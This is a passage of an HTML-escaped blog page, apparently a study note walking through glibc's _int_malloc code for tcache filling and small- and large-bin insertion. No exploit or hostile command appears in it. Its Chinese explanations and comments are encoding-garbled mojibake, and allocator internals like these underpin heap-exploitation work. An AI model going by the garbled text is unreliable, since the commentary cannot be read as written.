class=&#34;keyword&#34;&gt;if&lt;/span&gt; (av != &amp;amp;main_arena)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                set_non_main_arena (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; USE_TCACHE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;comment&#34;&gt;/* Fill cache first, return to user only if cache fills.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;                 We may return one of these chunks later.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (tcache_nb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  &amp;amp;&amp;amp; tcache-&amp;gt;counts[tc_idx] &amp;lt; mp_.tcache_count)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  tcache_put (victim, tc_idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  return_cached = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              check_malloced_chunk (av, victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *p = chunk2mem (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              alloc_perturb (p, bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; USE_TCACHE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ8№╝ЅтдѓТъю chunk тцДт░ЈСИЇтљѕжђѓ№╝їт░▒т░єтЁХТЈњтЁЦт»╣т║ћуџё bin СИГсђѓТЈњтЁЦУ┐ЄуеІС╣Ът░▒Тў»тЈїжЊЙУАеТЈњтЁЦу╗Њуѓ╣уџёУ┐ЄуеІсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;comment&#34;&gt;/* place chunk in bin */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (in_smallbin_range (size)) &lt;span class=&#34;comment&#34;&gt;//тюеsmall binУїЃтЏ┤тєЁ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              victim_index = smallbin_index (size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;comment&#34;&gt;//bckТїЄтљЉтц┤Уіѓуѓ╣№╝їfwdТў»тц┤Уіѓуѓ╣уџёfdУіѓуѓ╣№╝їchunkС╝џУбФТЈњтЁЦтѕ░тц┤Уіѓуѓ╣тњїfwdУіѓуѓ╣С╣ІжЌ┤&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              bck = bin_at (av, victim_index);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              fwd = bck-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//тюеlarge binУїЃтЏ┤тєЁ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              victim_index = largebin_index (size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              bck = bin_at (av, victim_index);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              fwd = bck-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;comment&#34;&gt;//жюђУдЂт»╣тЈїтљЉжЊЙУАеУ┐ЏУАїуџёжбЮтцќТЊЇСйю№╝їchunkтцДт░ЈТїЅfd_nextsizeуџёТќ╣тљЉжђњтЄЈ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;comment&#34;&gt;/* maintain large bins in sorted order */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fwd != bck) &lt;span class=&#34;comment&#34;&gt;//large binжЊЙУАеСИЇСИ║уЕ║&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  &lt;span class=&#34;comment&#34;&gt;/* Or with inuse bit to speed comparisons */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  size |= PREV_INUSE; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  &lt;span class=&#34;comment&#34;&gt;/* if smaller than smallest, bypass loop below */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  assert (chunk_main_arena (bck-&amp;gt;bk));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  &lt;span class=&#34;comment&#34;&gt;//bck-&amp;gt;bk Тў»Тюђт░Јуџёchunk№╝їтдѓТъют░ЈС║јт«Ѓ№╝їт░▒т░єchunkтіатЁЦbckРђћ&amp;gt;bk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      &amp;lt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) chunksize_nomask (bck-&amp;gt;bk))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      fwd = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      bck = bck-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      victim-&amp;gt;fd_nextsize = fwd-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      victim-&amp;gt;bk_nextsize = fwd-&amp;gt;fd-&amp;gt;bk_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      fwd-&amp;gt;fd-&amp;gt;bk_nextsize = victim-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;// СИЇт░ЈС║јТюђт░Јуџёchunk т░▒жђџУ┐Єfd_nextsizeТЅЙтѕ░СИЇт┐ЁС╗ќтцДуџёchunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      assert (chunk_main_arena (fwd));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) size &amp;lt; chunksize_nomask (fwd))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          fwd = fwd-&amp;gt;fd_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          assert (chunk_main_arena (fwd));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;						&lt;span class=&#34;comment&#34;&gt;//тдѓТъютцДт░ЈуЏИуГЅ№╝їТЈњтЁЦтѕ░chunkуџёfdтцё№╝їТЌажюђТћ╣тіеnextsizeТъёТѕљуџётЈїтљЉжЊЙУАе&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) size&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          == (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) chunksize_nomask (fwd))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;comment&#34;&gt;/* Always insert in the second position.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        fwd = fwd-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;// тљдтѕЎжюђУдЂТЈњтЁЦnextsizeуџётЈїтљЉжЊЙУАе&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          victim-&amp;gt;fd_nextsize = fwd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          victim-&amp;gt;bk_nextsize = fwd-&amp;gt;bk_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (fwd-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize != fwd))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): largebin double linked list corrupted (nextsize)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          fwd-&amp;gt;bk_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                          victim-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      bck = fwd-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (bck-&amp;gt;fd != fwd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): largebin double linked list corrupted (bk)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//тдѓТъюlarge bin жЊЙУАеСИ║уЕ║№╝їт░єnextsize ТїЄтљЉУЄфти▒тЇ│тЈ»&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                victim-&amp;gt;fd_nextsize = victim-&amp;gt;bk_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          mark_bin (av, victim_index);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          victim-&amp;gt;bk = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          victim-&amp;gt;fd = fwd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          fwd-&amp;gt;bk = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          bck-&amp;gt;fd = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; USE_TCACHE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* If we&amp;#x27;ve processed as many chunks as we&amp;#x27;re allowed while&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         filling the cache, return one of the cached ones.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++tcache_unsorted_count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (return_cached&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;amp;&amp;amp; mp_.tcache_unsorted_limit &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;amp;&amp;amp; tcache_unsorted_count &amp;gt; mp_.tcache_unsorted_limit)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; tcache_get (tc_idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ9№╝ЅтдѓТъюућеТѕиућ│У»иуџё chunk Тў» large chunk №╝їт░▒тюеуггСИђСИфтЙфуј»у╗ЊТЮЪтљјТљюу┤б large bin сђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span 